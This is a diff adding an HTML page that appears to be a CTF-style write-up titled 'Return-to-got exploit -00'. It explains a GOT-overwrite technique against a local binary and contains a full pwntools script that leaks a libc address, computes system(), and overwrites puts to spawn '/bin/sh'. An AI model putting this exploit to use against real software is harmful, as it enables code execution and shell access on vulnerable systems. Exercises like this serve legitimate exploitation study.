@@ -1,0 +1,116 @@
+<html>
+ <head>
+<title> GOT-00 </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> GOT-00 </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Return-to-got exploit -00 </h1>
+   
+ <br> 
+
+<p> OK this one is easy exploit : Overwriting Global Offset Table (GOT) it can be used even if ASLR is on  <br> 
+    1.) leak the GOT's adress i found out that it is 60'th position above our buffer <br>
+    2.) Calculate the system address <br>
+    3.) Now overwrite the Got 0f puts with system address and as puts argumen is (buffer) overflow it with the string '/bin/sh' <br>  </p>
+
+
+<br><br>  
+
+<code> 
+
+from pwn import *
+p=process("got")
+print p.recvuntil("?\n")
+# which buffer
+p.sendline("1")
+print 1
+p.recvline()
+# index
+p.sendline("-60")
+msg=p.recv(4)
+msg=u32(msg)
+print hex(msg) 
+
+system=msg-0x23ca0
+print "[+] Target address"
+print hex(system)
+
+payload=pack(system)+"A"*72+"/bin/sh\x00"
+
+# overwriting part which buffer
+print p.recvuntil("?\n")
+p.sendline("1")
+p.recvline()
+# index
+p.sendline("-76")
+# write part
+print "[+] sending payload"
+p.sendline(payload)
+
+p.interactive()
+
+#raw_input()
+
+ </code>
+
+</body>
+</html>
